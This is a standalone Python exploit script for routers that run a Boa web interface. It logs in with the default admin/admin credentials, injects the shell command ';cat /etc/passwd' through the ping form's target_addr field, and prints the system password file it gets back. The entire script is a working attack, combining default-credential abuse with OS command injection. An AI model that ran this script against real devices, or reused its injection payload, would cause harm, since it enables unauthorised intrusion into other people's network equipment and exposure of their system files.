#!/usr/bin/python

import sys
import requests
from bs4 import BeautifulSoup

IP_ADDR = str(sys.argv[1])

success_string = "ERROR:you have logined! please logout at first and then login!"
forbidden_string = "403 Forbidden"
bad_string = "ERROR:bad password!"


def printDetails():
    attack = dict(target_addr=';cat /etc/passwd', waninf='LAN')
    c = requests.post('http://%s/boaform/admin/formPing' %
                      IP_ADDR.strip('http://').strip('/'), data=attack)
    if "admin" in c.text:
        soup = BeautifulSoup(c.text, "html.parser")
        findpre = str(soup('pre'))
        strippre = findpre.strip("[<pre>").strip("</pre>]")
        print(strippre)
        print("[+] Successful! Quitting...")


def logIn():
    payload = dict(username='admin', psd='admin')
    login = requests.post('http://%s/boaform/admin/formLogin_en' %
                          IP_ADDR.strip('http://').strip('/'), data=payload)
    if bad_string not in login.text:
        print("[+] Logged in!")
        printDetails()
    elif bad_string in login.text:
        print("[-] Could not login with default password! Quitting...")
        exit(1)


def testVuln():
    try:
        test = requests.get('http://%s/boaform/admin/formLogin_en' %
                            IP_ADDR.strip('http://').strip('/'))
        if test.status_code == 404:
            print("[-] Could not locate login page. Quitting...")
            exit(1)
        if bad_string in test.text:
            logIn()
        if success_string in test.text:
            printDetails()
        if test.status_code == 403:
            if forbidden_string in test.text:
                print("[-] Too many failed login attempts. Try later.")
            exit(1)
    except requests.exceptions.RequestException as e:
        print("[-] An error occurred.")
        print("[-] Details: %s" % e)
        print("[-] Quitting...")
        exit(1)


testVuln()
